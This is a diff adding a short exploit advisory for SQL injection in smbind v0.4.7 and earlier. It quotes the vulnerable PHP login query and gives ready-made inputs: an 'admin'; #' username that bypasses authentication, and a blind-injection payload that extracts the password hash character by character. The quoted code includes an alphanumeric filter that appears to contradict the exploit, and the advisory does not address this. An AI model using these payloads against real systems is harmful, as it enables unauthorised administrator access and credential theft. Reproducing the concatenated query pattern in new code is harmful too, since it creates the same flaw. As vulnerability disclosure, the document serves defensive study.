@@ -1,0 +1,42 @@
+##############################################################################################
+#
+# smbind <= v.0.4.7 Sql Injection
+# Site: https://sourceforge.net/projects/smbind/files/
+# Reported on 28/08/2010
+#
+# Author: IHTeam
+#
+##############################################################################################
+#
+# Buggy code:
+#
+if(isset($_POST['username']) && isset($_POST['password'])) {
+        if((!filter("alphanum", $_POST['username'])) or (!filter("alphanum", $_POST['password']))) {
+                die("Username and password must contain only letters and numbers.");
+        }
+        $_SESSION['username'] = $_POST['username'];
+        $_SESSION['password'] = $_POST['password'];
+}
+
+if(isset($_SESSION['username']) && isset($_SESSION['password'])) {
+        $res = $dbconnect->query("SELECT ID FROM users WHERE username = '" . $_SESSION['username'] ."' AND password = '" . md5($_SESSION['password']) . " ' ");
+#
+##############################################################################################
+#
+# Easy admin login
+#
+# Enter in username field: admin'; #
+# Enter in password field: [anything]
+#
+# Sql query will result like this: SELECT ID FROM users WHERE username = 'admin'; #' AND password = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
+#
+##############################################################################################
+#
+# Limitation and Blind Sql Injection
+#
+# You're able to make blind sql injection too. Just input in username field something like this:
+# admin' AND SUBSTRING(password,1,1)=char(49); #
+#
+# That sql injection work only with magic_quote_gpc = Off
+#
+##############################################################################################
